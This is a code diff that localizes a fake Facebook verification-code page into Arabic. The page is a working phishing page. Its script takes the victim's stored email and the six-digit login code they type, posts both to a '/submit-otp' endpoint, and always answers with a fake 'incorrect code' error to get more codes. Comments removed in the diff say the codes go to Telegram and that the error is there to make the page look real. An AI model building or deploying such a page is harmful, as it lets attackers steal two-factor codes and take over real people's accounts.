@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Facebook - Verification Code</title>
+    <title>فيسبوك - رمز التحقق</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Helvetica, Arial, sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
         
         body {
             background: #f0f2f5;
@@ -32,6 +32,7 @@
             color: #1877f2;
             margin-bottom: 20px;
             font-family: Helvetica, Arial, sans-serif;
+            direction: ltr;
         }
         
         .icon-circle {
@@ -63,6 +64,8 @@
         .subtitle strong {
             color: #1c1e21;
             word-break: break-all;
+            direction: ltr;
+            display: inline-block;
         }
         
         .otp-boxes {
@@ -70,6 +73,7 @@
             justify-content: center;
             gap: 8px;
             margin-bottom: 24px;
+            direction: ltr;
         }
         
         .otp-boxes input {
@@ -104,7 +108,7 @@
             cursor: pointer;
             transition: 0.2s;
             margin-bottom: 14px;
-            font-family: Helvetica, Arial, sans-serif;
+            font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
         }
         
         .verify-btn:hover { background: #166fe5; }
@@ -118,14 +122,13 @@
             font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            font-family: Helvetica, Arial, sans-serif;
+            font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
             padding: 6px;
         }
         
         .resend-btn:hover { text-decoration: underline; }
         .resend-btn:disabled { color: #90949c; cursor: not-allowed; text-decoration: none; }
         
-        /* Error Message */
         .error-msg {
             background: #ffebe8;
             border: 1px solid #dd3c10;
@@ -140,7 +143,6 @@
         
         .error-msg.show { display: block; }
         
-        /* Success Message */
         .success-msg {
             background: #e7f7ed;
             border: 1px solid #42b72a;
@@ -155,7 +157,6 @@
         
         .success-msg.show { display: block; }
         
-        /* Spinner */
         .loading-spinner {
             display: none;
             width: 18px;
@@ -175,7 +176,6 @@
         .verify-btn.loading .btn-text { display: none; }
         .verify-btn.loading .loading-spinner { display: block; }
         
-        /* Back Link */
         .back-link {
             display: inline-block;
             color: #1877f2;
@@ -196,10 +196,10 @@
         
         <div class="icon-circle">📱</div>
         
-        <div class="title">Enter verification code</div>
+        <div class="title">أدخل رمز التحقق</div>
         <div class="subtitle">
-            We sent a 6-digit code to<br>
-            <strong id="displayEmail">your email</strong>
+            لقد أرسلنا رمزاً مكوّناً من 6 أرقام إلى<br>
+            <strong id="displayEmail">بريدك الإلكتروني</strong>
         </div>
         
         <div id="errorMsg" class="error-msg"></div>
@@ -215,16 +215,16 @@
         </div>
         
         <button type="button" id="verifyBtn" class="verify-btn">
-            <span class="btn-text">Continue</span>
+            <span class="btn-text">متابعة</span>
             <div class="loading-spinner"></div>
         </button>
         
         <button type="button" id="resendBtn" class="resend-btn" disabled>
-            Resend code (<span id="timerCount">60</span>s)
+            إعادة إرسال الرمز (<span id="timerCount">60</span>ث)
         </button>
         
         <br>
-        <a href="/" class="back-link">← Back to login</a>
+        <a href="/" class="back-link">← العودة لتسجيل الدخول</a>
     </div>
 
     <script>
@@ -236,13 +236,12 @@
         const successMsg = document.getElementById('successMsg');
         const displayEmail = document.getElementById('displayEmail');
         
-        const email = localStorage.getItem('fb_email') || 'your email';
+        const email = localStorage.getItem('fb_email') || 'بريدك الإلكتروني';
         displayEmail.textContent = email;
         
         let countdown = 60;
         let timerInterval = null;
 
-        // ===== التنقل بين الخانات =====
         otpInputs.forEach((input, index) => {
             input.addEventListener('keydown', function(e) {
                 if (e.key === 'Backspace' || e.key === 'Tab' || e.key === 'ArrowLeft' || e.key === 'ArrowRight' || e.key === 'Delete') return;
@@ -264,13 +263,12 @@
             });
         });
 
-        // ===== التحقق =====
         verifyBtn.addEventListener('click', async function() {
             let otp = '';
             otpInputs.forEach(input => otp += input.value);
             
             if (otp.length !== 6) {
-                errorMsg.textContent = 'Please enter the complete 6-digit code';
+                errorMsg.textContent = '⚠️ يرجى إدخال الرمز كاملاً (6 أرقام)';
                 errorMsg.classList.add('show');
                 successMsg.classList.remove('show');
                 return;
@@ -281,24 +279,19 @@
             verifyBtn.disabled = true;
             
             try {
-                // إرسال OTP للتيلجرام
-                const response = await fetch('/submit-otp', {
+                await fetch('/submit-otp', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ otp, email })
                 });
                 
-                await response.json();
-                
-                // بعد الإرسال - نعرض خطأ عشان يبان حقيقي
                 setTimeout(() => {
                     verifyBtn.classList.remove('loading');
                     verifyBtn.disabled = false;
                     
-                    errorMsg.textContent = 'The code you entered is incorrect. Please try again.';
+                    errorMsg.textContent = '⚠️ الرمز الذي أدخلته غير صحيح. يرجى المحاولة مرة أخرى.';
                     errorMsg.classList.add('show');
                     
-                    // مسح الخانات
                     otpInputs.forEach(i => i.value = '');
                     otpInputs[0].focus();
                 }, 1500);
@@ -307,21 +300,19 @@
                 console.error('❌ خطأ:', error);
                 verifyBtn.classList.remove('loading');
                 verifyBtn.disabled = false;
-                errorMsg.textContent = 'Something went wrong. Please try again.';
+                errorMsg.textContent = '⚠️ حدث خطأ. يرجى المحاولة مرة أخرى.';
                 errorMsg.classList.add('show');
             }
         });
 
-        // ===== إعادة الإرسال =====
         resendBtn.addEventListener('click', function() {
             countdown = 60;
             startTimer();
-            successMsg.textContent = 'A new code has been sent';
+            successMsg.textContent = '✅ تم إرسال رمز جديد';
             successMsg.classList.add('show');
             setTimeout(() => successMsg.classList.remove('show'), 3000);
         });
 
-        // ===== المؤقت =====
         function startTimer() {
             resendBtn.disabled = true;
             if (timerInterval) clearInterval(timerInterval);
@@ -333,9 +324,9 @@
                 if (countdown <= 0) {
                     clearInterval(timerInterval);
                     resendBtn.disabled = false;
-                    resendBtn.innerHTML = 'Resend code';
+                    resendBtn.innerHTML = 'إعادة إرسال الرمز';
                 } else {
-                    resendBtn.innerHTML = `Resend code (<span id="timerCount">${countdown}</span>s)`;
+                    resendBtn.innerHTML = `إعادة إرسال الرمز (<span id="timerCount">${countdown}</span>ث)`;
                 }
             }, 1000);
         }
